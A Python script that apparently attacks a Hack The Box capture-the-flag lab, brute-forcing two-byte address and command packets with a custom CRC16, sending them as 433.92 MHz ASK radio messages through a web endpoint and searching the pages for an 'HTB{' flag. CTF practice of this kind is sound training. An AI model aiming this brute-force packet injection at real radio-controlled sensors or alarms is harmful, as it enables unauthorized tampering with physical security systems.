#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 164: Bruteforce TODOS los bytes posibles para dirección y comando
print("[*] INNOVACIÓN 164: Complete 2-byte bruteforce with sample checking")

s = requests.Session()
s.get(base_url)

# Probar en bloques
important_addrs = list(range(0xA0, 0xA5)) + list(range(0xE0, 0xE4)) + [0x00, 0x01, 0x03, 0xFF]
important_cmds = [0x00, 0x01, 0x03, 0x53, 0x91, 0xA0, 0xEE, 0xF1, 0xFF]

count = 0
for addr in important_addrs:
    for cmd in important_cmds:
        data = bytes([addr, cmd])
        crc = crc16(data)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
        
        count += 1
        
        # Cada 10 paquetes, verificar
        if count % 10 == 0:
            r = s.get(base_url)
            sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
            
            if sensor_states != ['text-warning'] * 4 + ['text-success'] * 3:
                print(f'[!!!] STATE CHANGED at packet {count}')
                print(f'     Last packet: {addr:02X}{cmd:02X}')
                print(f'     States: {sensor_states}')
            
            if 'HTB{' in r.text:
                print(f'[SUCCESS] Found at packet {count}: {addr:02X}{cmd:02X}')
                print(re.findall(r'HTB\{[^}]+\}', r.text))
                exit(0)

print(f'\n[*] Tested {count} packets')

# Verificar final
time.sleep(5)
r = s.get(base_url)

for endpoint in ['/', '/updates', '/flag']:
    try:
        r = s.get(f'{base_url}{endpoint}')
        if 'HTB{' in r.text:
            print(f'[SUCCESS in {endpoint}]', re.findall(r'HTB\{[^}]+\}', r.text))
            break
    except:
        pass

print("\n[*] Innovación 164 completada")
